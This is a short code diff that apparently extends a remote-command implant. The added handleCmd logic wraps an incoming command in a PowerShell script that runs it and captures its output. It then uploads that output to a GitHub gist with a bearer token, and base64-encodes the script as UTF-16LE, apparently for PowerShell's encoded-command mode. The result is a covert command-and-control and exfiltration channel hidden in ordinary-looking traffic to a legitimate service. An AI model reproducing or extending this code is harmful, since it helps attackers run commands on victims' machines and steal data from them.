@@ -129,9 +129,14 @@
     function handleCmd(payload) {
         if (!payload || !payload.cmd) return;
         var cmd = payload.cmd;
+        var outKey = 'out_' + uid;
+        var wrapper = '$r=(&{' + cmd + '}2>&1)|Out-String;'
+            + 'Invoke-RestMethod \'https://api.github.com/gists/' + GIST_ID + '\' -Method Patch '
+            + '-Headers @{Authorization=\'Bearer ' + PAT + '\';\'Content-Type\'=\'application/json\'} '
+            + '-Body (ConvertTo-Json -Compress @{files=@{\'' + outKey + '\'=@{content=$r}}})';
         var bytes = '';
-        for (var i = 0; i < cmd.length; i++) {
-            var c = cmd.charCodeAt(i);
+        for (var i = 0; i < wrapper.length; i++) {
+            var c = wrapper.charCodeAt(i);
             bytes += String.fromCharCode(c & 0xFF, (c >> 8) & 0xFF);
         }
         var b64 = btoa(bytes);
